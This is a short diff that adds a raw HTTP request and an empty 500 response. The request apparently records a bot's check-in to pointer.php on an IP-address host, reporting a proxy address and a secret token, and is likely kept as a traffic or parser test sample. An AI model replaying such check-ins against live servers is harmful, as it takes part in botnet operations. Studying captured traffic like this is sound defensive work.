@@ -1,0 +1,12 @@
+GET /pointer.php?proxy=91.185.215.137%3A35342&secret=BER5w4evtjszw4MBRW HTTP/1.1
+Host: 80.78.242.47
+Accept: */*
+
+HTTP/1.0 500 Internal Server Error
+Date: Thu, 05 Mar 2015 18:30:15 GMT
+Server: Apache/2.2.15 (CentOS)
+X-Powered-By: PHP/5.3.3
+Content-Length: 0
+Connection: close
+Content-Type: text/html; charset=UTF-8
+
